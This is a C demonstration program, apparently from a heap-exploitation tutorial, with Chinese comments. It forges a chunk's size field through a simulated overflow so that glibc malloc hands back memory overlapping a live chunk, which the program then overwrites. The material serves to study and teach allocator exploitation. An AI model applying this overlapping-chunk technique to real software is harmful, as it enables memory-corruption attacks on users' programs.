#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main(){
  
  intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
  int prev_in_use = 0x1;

  fprintf(stderr, "\n一开始分配 5 个 chunk");

  p1 = malloc(1000);
  p2 = malloc(1000);
  p3 = malloc(1000);
  p4 = malloc(1000);
  p5 = malloc(1000);

  real_size_p1 = malloc_usable_size(p1);
  real_size_p2 = malloc_usable_size(p2);
  real_size_p3 = malloc_usable_size(p3);
  real_size_p4 = malloc_usable_size(p4);
  real_size_p5 = malloc_usable_size(p5);

  fprintf(stderr, "\nchunk p1 从 %p 到 %p", p1, (unsigned char *)p1+malloc_usable_size(p1));
  fprintf(stderr, "\nchunk p2 从 %p 到 %p", p2,  (unsigned char *)p2+malloc_usable_size(p2));
  fprintf(stderr, "\nchunk p3 从 %p 到 %p", p3,  (unsigned char *)p3+malloc_usable_size(p3));
  fprintf(stderr, "\nchunk p4 从 %p 到 %p", p4, (unsigned char *)p4+malloc_usable_size(p4));
  fprintf(stderr, "\nchunk p5 从 %p 到 %p\n", p5,  (unsigned char *)p5+malloc_usable_size(p5));

  memset(p1,'A',real_size_p1);
  memset(p2,'B',real_size_p2);
  memset(p3,'C',real_size_p3);
  memset(p4,'D',real_size_p4);
  memset(p5,'E',real_size_p5);
  
  fprintf(stderr, "\n释放掉堆块 p4，在这种情况下不会用 top chunk 合并\n");
  free(p4);

  fprintf(stderr, "\n假设 p1 上的漏洞，该漏洞会把 p2 的 size 改成 p2+p3 的 size\n");

  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2;

  fprintf(stderr, "\nfree p2 的时候分配器会因为 p2+p2.size 的结果指向 p4，而误以为下一个 chunk 是 p4\n");
  fprintf(stderr, "\n这样的话将会 free 掉的 p2 将会包含 p3\n");
  free(p2);
  
  fprintf(stderr, "\n现在去申请 2000 大小的 chunk p6 的时候，会把之前释放掉的 p2 与 p3 一块申请回来\n");

  p6 = malloc(2000);
  real_size_p6 = malloc_usable_size(p6);

  fprintf(stderr, "\nchunk p6 从 %p 到 %p", p6,  (unsigned char *)p6+real_size_p6);
  fprintf(stderr, "\nchunk p3 从 %p 到 %p\n", p3, (unsigned char *) p3+real_size_p3);

  fprintf(stderr, "\np3 中的内容: \n\n");
  fprintf(stderr, "%s\n",(char *)p3);

  fprintf(stderr, "\n往 p6 中写入\"F\"\n");
  memset(p6,'F',1500);

  fprintf(stderr, "\np3 中的内容: \n\n");
  fprintf(stderr, "%s\n",(char *)p3);
}
